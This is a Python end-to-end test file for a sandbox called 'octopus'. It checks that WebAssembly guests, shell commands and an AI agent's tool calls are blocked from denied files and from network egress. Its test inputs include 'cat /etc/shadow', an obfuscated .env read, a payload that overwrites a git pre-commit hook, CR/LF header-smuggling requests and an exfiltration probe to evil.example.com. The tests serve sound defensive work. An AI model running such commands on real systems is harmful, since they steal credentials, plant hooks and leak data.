"""Tier 5: Adversarial Hardening & Regression E2E Probes — 6 tests."""

from __future__ import annotations

import json
import sys
import unittest

from . import helpers


class TestTier5Adversarial(unittest.TestCase):
    """6 Tier 5 white-box adversarial regression E2E tests."""

    def test_t5_01_wasm_scratch_read_write_enforces_fs_and_cedar(self) -> None:
        """T5: Wasmtime `.wat` `scratch_read`/`scratch_write` enforces `filesystem` + Cedar `forbid` before `open_confined`."""
        octo = helpers.require_octopus_bin()
        with helpers.TempWorkspace() as ws:
            ws.make_dir("allowed_out")
            ws.make_dir(".git/hooks")
            ws.write_file("secret.txt", "TOP_SECRET_CANARY_TOKEN_98765")
            cedar_file = ws.write_file(
                "wasm_fs.cedar",
                (
                    'forbid (\n'
                    '    principal,\n'
                    '    action == Octopus::Action::"fs_read",\n'
                    '    resource is Octopus::FilePath\n'
                    ') when {\n'
                    '    context has normalized_path && context.normalized_path like "*secret*"\n'
                    '};\n'
                    'forbid (\n'
                    '    principal,\n'
                    '    action == Octopus::Action::"fs_write",\n'
                    '    resource is Octopus::FilePath\n'
                    ') when {\n'
                    '    context has normalized_path && context.normalized_path like "*.git*"\n'
                    '};\n'
                ),
            )
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [],
                    "cedar_file": str(cedar_file),
                    "filesystem": {
                        "allow_read": [str(ws.path / "allowed_out")],
                        "allow_write": [str(ws.path / "allowed_out")],
                        "deny": ["secret.txt"],
                    },
                    "limits": {"timeout_secs": 5, "memory_mb": 16},
                },
            )
            probe_wat = ws.write_file(
                "probe_fs.wat",
                (
                    '(module\n'
                    '  (import "octopus_wasi" "scratch_read" (func $sread (param i32 i32 i32 i32) (result i32)))\n'
                    '  (import "octopus_wasi" "scratch_write" (func $swrite (param i32 i32 i32 i32) (result i32)))\n'
                    '  (memory (export "memory") 1)\n'
                    '  (data (i32.const 0) "secret.txt")\n'
                    '  (data (i32.const 32) "outside.txt")\n'
                    '  (data (i32.const 64) ".git/hooks/pre-commit")\n'
                    '  (data (i32.const 96) "allowed_out/ok.txt")\n'
                    '  (data (i32.const 128) "PWNED_BY_WASM")\n'
                    '  (data (i32.const 160) "SAFE_WASM")\n'
                    '  (func (export "octopus_run") (result i32)\n'
                    '    (local $r_sec i32)\n'
                    '    (local $r_out i32)\n'
                    '    (local $r_git i32)\n'
                    '    (local $r_ok i32)\n'
                    '    (local.set $r_sec (call $sread (i32.const 0) (i32.const 10) (i32.const 512) (i32.const 128)))\n'
                    '    (local.set $r_out (call $swrite (i32.const 32) (i32.const 11) (i32.const 128) (i32.const 13)))\n'
                    '    (local.set $r_git (call $swrite (i32.const 64) (i32.const 21) (i32.const 128) (i32.const 13)))\n'
                    '    (local.set $r_ok (call $swrite (i32.const 96) (i32.const 18) (i32.const 160) (i32.const 9)))\n'
                    '    (if (i32.and\n'
                    '          (i32.eq (local.get $r_sec) (i32.const -5))\n'
                    '          (i32.and\n'
                    '            (i32.eq (local.get $r_out) (i32.const -5))\n'
                    '            (i32.and (i32.eq (local.get $r_git) (i32.const -5)) (i32.eq (local.get $r_ok) (i32.const 9)))))\n'
                    '      (then (return (i32.const 0)))\n'
                    '    )\n'
                    '    (return (i32.const 1))\n'
                    '  )\n'
                    ')\n'
                ),
            )
            res = ws.run_octopus(
                ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", str(probe_wat)],
                octopus_bin=octo,
                timeout=15.0,
            )
            self.assertEqual(res.returncode, 0, f"Wasm FS probe failed: {res.combined_output}")
            self.assertFalse((ws.path / "outside.txt").exists(), "outside.txt was created by Wasm guest!")
            self.assertFalse((ws.path / ".git" / "hooks" / "pre-commit").exists(), ".git/hooks/pre-commit was created by Wasm guest!")
            self.assertEqual((ws.path / "allowed_out" / "ok.txt").read_text(encoding="utf-8"), "SAFE_WASM")

    def test_t5_02_strict_sandbox_cmd_blocks_deny_and_git_hooks_and_cleans_acls(self) -> None:
        """T5: `--sandbox strict` with shell allowed blocks `filesystem.deny` read and `.git/hooks` write, leaving zero leftover SID ACEs."""
        octo = helpers.require_octopus_bin()
        with helpers.TempWorkspace() as ws:
            ws.make_dir(".git/hooks")
            ws.write_file(".git/hooks/pre-commit", "ORIG_HOOK")
            ws.write_file("secret.txt", "TOP_SECRET_CANARY_TOKEN_98765")
            ws.write_file(".env", "SECRET_ENV_TOKEN_4242")
            shell_name = "cmd" if sys.platform == "win32" else "sh"
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [],
                    "commands": {"allow": [shell_name], "deny": []},
                    "filesystem": {
                        "allow_read": [str(ws.path)],
                        "allow_write": [str(ws.path)],
                        "deny": ["secret.txt", "./secret.txt", ".env", "./.env"],
                    },
                },
            )
            if sys.platform == "win32":
                read_cmd = ["cmd", "/c", "type secret.txt"]
                env_cmd = ["cmd", "/c", "set F=.en&& call type %F%v"]
                hook_cmd = ["cmd", "/c", "echo PWNED_HOOK>.git\\hooks\\pre-commit"]
                ok_cmd = ["cmd", "/c", "echo", "ALLOWED_SHELL_ECHO"]
            else:
                read_cmd = ["sh", "-c", "cat secret.txt"]
                env_cmd = ["sh", "-c", 'F=.en; cat "${F}v"']
                hook_cmd = ["sh", "-c", "echo PWNED_HOOK > .git/hooks/pre-commit"]
                ok_cmd = ["sh", "-c", "echo ALLOWED_SHELL_ECHO"]

            res_ok = ws.run_octopus(
                ["run", "--policy", str(policy), "--sandbox", "strict", "--cwd", str(ws.path), "--", *ok_cmd],
                octopus_bin=octo,
            )
            self.assertEqual(res_ok.returncode, 0, f"Allowed shell echo failed: {res_ok.combined_output}")
            self.assertIn("ALLOWED_SHELL_ECHO", res_ok.stdout)

            res_read = ws.run_octopus(
                ["run", "--policy", str(policy), "--sandbox", "strict", "--cwd", str(ws.path), "--", *read_cmd],
                octopus_bin=octo,
            )
            self.assertNotIn("TOP_SECRET_CANARY_TOKEN_98765", res_read.stdout)
            helpers.assert_blocked_outcome(res_read)

            res_env = ws.run_octopus(
                ["run", "--policy", str(policy), "--sandbox", "strict", "--cwd", str(ws.path), "--", *env_cmd],
                octopus_bin=octo,
            )
            self.assertNotEqual(res_env.returncode, 0, f"Denied .env read unexpectedly succeeded: {res_env.combined_output}")
            self.assertNotIn("SECRET_ENV_TOKEN_4242", res_env.stdout)
            if sys.platform == "win32":
                self.assertIn("access is denied.", res_env.stderr.lower())

            res_hook = ws.run_octopus(
                ["run", "--policy", str(policy), "--sandbox", "strict", "--cwd", str(ws.path), "--", *hook_cmd],
                octopus_bin=octo,
            )
            helpers.assert_blocked_outcome(res_hook)
            self.assertEqual((ws.path / ".git" / "hooks" / "pre-commit").read_text(encoding="utf-8"), "ORIG_HOOK")

            if sys.platform == "win32":
                acl_res = helpers.run_subprocess_safe(["icacls", str(ws.path), "/T"], timeout=15.0)
                self.assertEqual(acl_res.returncode, 0, acl_res.stderr)
                self.assertNotIn("S-1-15-2-", acl_res.stdout, f"Leftover AppContainer SID ACEs found:\n{acl_res.stdout}")

    def test_t5_03_proxy_rejects_bare_lf_and_cr_header_injection(self) -> None:
        """T5: Loopback proxy rejects bare LF (`\\n`) and bare CR (`\\r`) header injection with HTTP 400 without contacting upstream."""
        octo = helpers.require_octopus_bin()
        with helpers.LocalLoopbackMockServer() as srv, helpers.TempWorkspace() as ws:
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [srv.host_port],
                    "commands": {"allow": ["python", "python3"]},
                },
            )
            smuggle_probe = ws.write_file(
                "smuggle_probe.py",
                (
                    "import os, socket, sys, urllib.parse\n"
                    "p = urllib.parse.urlparse(os.environ['HTTP_PROXY'])\n"
                    f"host_port = {srv.host_port!r}\n"
                    f"url = {f'{srv.base_url}/smug'!r}\n"
                    "for label, bad_hdr in [('bare_lf', 'X-Test: val\\nX-Injected: pwned'), ('bare_cr', 'X-Test: val\\rX-Injected: pwned')]:\n"
                    "    raw = f'GET {url} HTTP/1.1\\r\\nHost: {host_port}\\r\\n{bad_hdr}\\r\\nConnection: close\\r\\n\\r\\n'.encode('latin1')\n"
                    "    with socket.create_connection((p.hostname, p.port), timeout=5) as s:\n"
                    "        s.sendall(raw)\n"
                    "        chunks = []\n"
                    "        while True:\n"
                    "            d = s.recv(4096)\n"
                    "            if not d:\n"
                    "                break\n"
                    "            chunks.append(d)\n"
                    "        resp = b''.join(chunks).decode('utf-8', errors='replace')\n"
                    "        status_line = resp.splitlines()[0] if resp else ''\n"
                    "        print(label, status_line)\n"
                    "        assert '400' in status_line, f'{label} expected 400 Bad Request, got: {resp!r}'\n"
                    "print('SMUGGLE_REJECTED_OK')\n"
                ),
            )
            res = ws.run_octopus(
                ["run", "--policy", str(policy), "--", sys.executable, str(smuggle_probe)],
                octopus_bin=octo,
            )
            self.assertEqual(res.returncode, 0, res.combined_output)
            self.assertIn("SMUGGLE_REJECTED_OK", res.stdout)
            self.assertEqual(srv.hit_count(), 0, f"Upstream received smuggled request: {srv.hits}")

    def test_t5_04_octopus_hook_subcommand_works_end_to_end(self) -> None:
        """T5: `octopus hook` subcommand prints help, evaluates Claude pre-tool payloads, and blocks `/etc/shadow`."""
        octo = helpers.require_octopus_bin()
        with helpers.TempWorkspace() as ws:
            r_help = ws.run_octopus(["hook", "--help"], octopus_bin=octo)
            self.assertEqual(r_help.returncode, 0, r_help.combined_output)
            self.assertIn("evaluate", r_help.stdout.lower())

            r_eval_help = ws.run_octopus(["hook", "evaluate", "--help"], octopus_bin=octo)
            self.assertEqual(r_eval_help.returncode, 0, r_eval_help.combined_output)

            bad_payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "cat /etc/shadow"}})
            r_block = helpers.run_subprocess_safe(
                [str(octo), "hook", "evaluate", "--agent", "claude"],
                cwd=ws.path,
                input_text=bad_payload,
                timeout=15.0,
            )
            self.assertNotEqual(r_block.returncode, 0, f"octopus hook failed to block /etc/shadow: {r_block.combined_output}")

            ok_payload = json.dumps({"tool_name": "Read", "tool_input": {"file_path": "README.md"}})
            r_allow = helpers.run_subprocess_safe(
                [str(octo), "hook", "evaluate", "--agent", "claude"],
                cwd=ws.path,
                input_text=ok_payload,
                timeout=15.0,
            )
            self.assertEqual(r_allow.returncode, 0, f"octopus hook falsely blocked benign Read: {r_allow.combined_output}")

    def test_t5_05_cedar_poisoned_qtable_non_interference(self) -> None:
        """T5: `octopus run --policy <custom>.cedar` produces identical verdicts with poisoned Q-tables and `OCTOPUS_ENABLE_RL_ADVISORY=1`."""
        octo = helpers.require_octopus_bin()
        with helpers.LocalLoopbackMockServer() as srv, helpers.TempWorkspace() as ws:
            cedar = ws.write_file(
                "non_interf.cedar",
                (
                    'permit (\n'
                    '    principal,\n'
                    '    action == Octopus::Action::"exec",\n'
                    '    resource is Octopus::Command\n'
                    ') when {\n'
                    '    context has stem && (context.stem == "python" || context.stem == "python3")\n'
                    '};\n'
                    'permit (\n'
                    '    principal,\n'
                    '    action == Octopus::Action::"egress",\n'
                    '    resource is Octopus::NetworkTarget\n'
                    ') when {\n'
                    '    context has destination_domain && context.destination_domain == "127.0.0.1"\n'
                    '};\n'
                ),
            )
            ok_py = ws.write_file("ok.py", helpers.proxy_probe_script(f"{srv.base_url}/ok"))
            bad_py = ws.write_file("bad.py", helpers.proxy_probe_script("http://evil.example.com/exfil"))

            for bias in ("HardMitigation", "PassiveObserve"):
                srv.clear_hits()
                ws.write_poisoned_rl_policy(bias=bias)
                env = helpers.default_clean_env({"OCTOPUS_ENABLE_RL_ADVISORY": "1"})
                r_ok = ws.run_octopus(
                    ["run", "--policy", str(cedar), "--cwd", str(ws.path), "--", sys.executable, str(ok_py)],
                    octopus_bin=octo,
                    env=env,
                )
                r_bad = ws.run_octopus(
                    ["run", "--policy", str(cedar), "--cwd", str(ws.path), "--", sys.executable, str(bad_py)],
                    octopus_bin=octo,
                    env=env,
                )
                self.assertEqual(r_ok.returncode, 0, f"[{bias}] .cedar allow failed: {r_ok.combined_output}")
                self.assertEqual(srv.hit_count(), 1)
                helpers.assert_blocked_outcome(r_bad)

    def test_t5_06_solo_pr_ship_validate_only_and_repo_hygiene(self) -> None:
        """T5: `scripts/solo_pr_ship.ps1 -ValidateOnly` passes and `check_repo_hygiene_paths` enforces expanded rules."""
        repo = helpers.get_config().repo_root
        ship_script = repo / "scripts" / "solo_pr_ship.ps1"
        self.assertTrue(ship_script.is_file(), f"Missing {ship_script}")
        if sys.platform == "win32":
            res = helpers.run_subprocess_safe(
                [
                    "powershell",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-File",
                    str(ship_script),
                    "-ValidateOnly",
                ],
                cwd=repo,
                timeout=30.0,
            )
            self.assertEqual(res.returncode, 0, f"solo_pr_ship.ps1 -ValidateOnly failed: {res.combined_output}")
        tracked = helpers.git_ls_files(repo)
        self.assertEqual(helpers.check_repo_hygiene_paths(tracked), [])
